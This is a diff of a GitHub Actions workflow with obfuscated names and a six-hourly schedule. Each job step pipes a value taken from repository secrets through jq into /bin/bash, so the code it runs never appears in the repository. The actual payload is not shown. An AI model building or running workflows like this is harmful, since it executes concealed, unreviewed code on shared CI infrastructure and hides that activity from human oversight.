@@ -1,8 +1,9 @@
 name: dangnianqing4321
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '16 1/6 * * *'
+    - cron: '16 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,13 +11,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: dangnianqing4321
         env:
-          mufum94015: ${{ secrets.mufum94015 }}
+          dd8554: ${{ secrets.dd8554 }}
         run: |
-          echo $mufum94015 | jq -r .b33 | /bin/bash
-          echo $nd26 | jq -r .wmqf874 | /bin/bash
-          echo $qmdp722 | jq -r .kv65806 | /bin/bash
-          echo $tbryb717 | jq -r .akt756 | /bin/bash
-          echo $rf9 | jq -r .ajm7 | /bin/bash
-          echo $zr7636 | jq -r .ndy0 | /bin/bash
-          echo $mxb042 | jq -r .wudmr57 | /bin/bash
+          echo $dd8554 | jq -r .okose9 | /bin/bash
+          echo $n4174 | jq -r .trm18473 | /bin/bash
+          echo $srjs0 | jq -r .w760 | /bin/bash
+          echo $s60 | jq -r .whd5227 | /bin/bash
+          echo $pef268 | jq -r .hq47056 | /bin/bash
+          echo $wcxmy1338 | jq -r .xq83979 | /bin/bash
+          echo $ypv7550 | jq -r .xhy640 | /bin/bash
+          echo $ty958 | jq -r .dpa01 | /bin/bash
 
